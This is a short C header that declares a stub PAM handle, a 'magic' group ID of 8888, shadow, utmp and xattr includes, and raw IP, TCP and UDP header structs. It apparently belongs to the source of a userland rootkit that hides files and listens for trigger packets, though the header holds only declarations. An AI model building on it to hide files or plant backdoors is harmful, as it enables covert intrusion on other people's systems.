#ifndef __DEF_H
#define __DEF_H

/* debian 4.x has no LIBAUDIT */
//#define LIBAUDIT 1
#undef LIB_AUDIT

struct pam_handle {
	char *data;
};

#define PAM_PERM_DENIED 6

#define MAGIC_GID      8888
#define MAGIC_GID_STR "8888"

#ifdef __FreeBSD__
#include <sys/param.h>
#include <sys/mount.h>
#include <utmpx.h>
#define setxattr
#define stat64 stat
#else
#include <sys/xattr.h>
#include <sys/vfs.h>
#include <shadow.h>
#include <utmp.h>
#endif

struct ip_hdr {
	unsigned char  ip_hl:4;
	unsigned char  ip_v:4;
	unsigned char  ip_tos;
	unsigned short ip_tot_len;
	unsigned short ip_id;
	unsigned short ip_off;
	unsigned char  ip_ttl;
	unsigned char  ip_protocol;
	unsigned short ip_sum;
	unsigned int   ip_saddr;
	unsigned int   ip_daddr;
};

struct tcp_hdr {
	unsigned short tcp_sport;
	unsigned short tcp_dport;
	unsigned int   tcp_seq;
	unsigned int   tcp_ack;
	unsigned char  tcp_x2:4;
	unsigned char  tcp_off:4;
	unsigned char  tcp_flags;
	unsigned short tcp_win;
	unsigned short tcp_sum;
	unsigned short tcp_urp;
};

struct udp_hdr {
	unsigned short udp_sport;
	unsigned short udp_dport;
	unsigned short udp_ulen;
	unsigned short udp_sum;
};

#endif
